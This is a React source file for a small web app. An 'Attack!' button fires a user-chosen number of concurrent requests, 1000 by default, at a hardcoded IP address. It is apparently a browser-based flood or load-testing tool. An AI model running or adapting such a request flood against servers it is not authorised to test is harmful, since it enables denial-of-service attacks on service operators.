import React, { useState } from 'react';
import { CrossBlock } from './components/CrossBlock/CrossBlock';

export default function App() {
    const [zergSize, setZergSize] = useState(1000);
    const [isZerging, setIsZerging] = useState(false);

    const onStartLoadPressed = async () => {
        setIsZerging(true);
        const promises = [];
        for (let i = 0; i < zergSize; i++) {
            const action = async () => {
                const resp = await fetch('http://48.216.217.20/get_json',);
                console.log(resp.statusText);
            }
            promises.push(action());
        }
        console.log('All messages generated');
        await Promise.all(promises);
        console.log('All messages sent');
        setIsZerging(false);
    }
    const onZergSizeInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        e.preventDefault();
        setZergSize(Number.parseInt(e.target.value));
    }

    return (
        <div style={{ display: 'flex', flexDirection: 'column', alignContent: 'space-evenly', justifyContent: 'center' }}>
            <CrossBlock />
            <div style={{ alignSelf: 'center' }}>
                Set size of zerg:
                <input value={zergSize} type='number' onChange={onZergSizeInputChange} style={{ marginLeft: 8, marginRight: 16 }} />
                <button onClick={onStartLoadPressed}>Attack!</button>
            </div>
            <div style={{ alignSelf: 'center', marginTop: 8, height: '2em' }}>{isZerging && 'Zerg is on its way. Check DevTools console for results'}</div>
            <CrossBlock />
        </div>
    )
}